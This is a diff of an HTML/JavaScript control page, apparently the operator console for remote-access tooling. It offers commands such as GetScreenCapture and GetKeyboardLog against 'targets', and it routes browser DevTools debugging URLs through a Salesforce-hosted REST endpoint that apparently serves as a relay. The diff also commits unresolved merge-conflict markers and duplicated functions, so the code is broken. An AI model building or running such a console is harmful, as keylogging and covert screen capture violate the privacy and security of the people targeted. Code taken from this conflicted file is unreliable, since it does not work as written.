@@ -106,7 +106,10 @@
                         <option value="GetScreenCapture">GetScreenCapture</option>
                         <option value="GetKeyboardLog">GetKeyboardLog</option>
                         <option value="GetSystemOverview">GetSystemOverview</option>
+<<<<<<< HEAD
                         <option value="GetClientCommands">GetClientCommands</option>
+=======
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
                     </select>              
                 </td>
                 <td>
@@ -228,6 +231,7 @@
 
     <br/>
     <br/>
+<<<<<<< HEAD
     
     <table border="1">
         <tr>
@@ -239,6 +243,19 @@
     </table>
 
     <table id="commandsList" border="1">
+=======
+        
+    <table border="1">
+        <tr>
+            <th>Commands ( <a href="javascript:void(0);" onclick="expandTable('commandsTable');">Expand</a> | 
+                <a href="javascript:void(0);" onclick="collapseTable('commandsTable');">Collapse</a> | 
+                <a href="javascript:void(0);" onclick="clearTable('commandsTable');">Clear</a> | 
+                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Refresh</a> )
+            </th>
+        </tr>
+    </table>
+    <table id="commandsTable" border="1">
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
     </table>
 
     <br/>
@@ -426,7 +443,19 @@
     </script>
 
     <script>
+<<<<<<< HEAD
         
+=======
+        function navigateDebug() {
+            let elem = document.getElementById('devtoolsFrontendUrl');
+            let fullUrl = elem.value;
+            const urlObj = new URL(fullUrl);
+            const relativeUrl = urlObj.pathname + urlObj.search + urlObj.hash;
+
+            document.getElementById('processCDPUrl').value = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/processcdp'+relativeUrl;
+        }
+
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
         function createBuiltInCmd(cmdname) {
 
             let payload = { 
@@ -469,6 +498,59 @@
             });
         }
 
+<<<<<<< HEAD
+=======
+        function addMessage(message) {
+            
+            const table = document.getElementById("messagesTable");
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item) => {
+                let newRow = tbody.insertRow(-1);
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                newCell.textContent = JSON.stringify(item, null, 2);
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:message, path:''} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                
+                insertrow(path + '.' + objName, '[---------]');
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+            newRow = tbody.insertRow(-1);
+            newCell = newRow.insertCell(0);
+            newCell.textContent = '-------------------- ';
+            newCell = newRow.insertCell(1);
+            newCell.textContent = '--------------------';
+        }
+        
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
         function processMessage(messageEvent) {
             let message = messageEvent.message;
 
@@ -530,6 +612,7 @@
 
     </script>
 
+<<<<<<< HEAD
     <!-- populate/refresh/update ui -->
     <script>
         function navigateDebug() {
@@ -602,6 +685,9 @@
             newCell.colSpan = 2;
         }
         
+=======
+    <script>
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
         function refreshTargets(targets) {
             refreshTargetsTable(targets);
             refreshTargetIdList(targets);
@@ -766,6 +852,17 @@
             });
         }
 
+<<<<<<< HEAD
+=======
+        function refreshCommands(commandsList) {
+            let telem = document.getElementById('commandsTable');
+
+            commandsList.forEach( cmd => {
+                console.log(cmd);
+            });
+        }
+
+>>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
         function handleTargetIdChange(elem) {
             console.log('handleTargetIdChange: '+elem.value);
             let telem = document.getElementById('targetId');
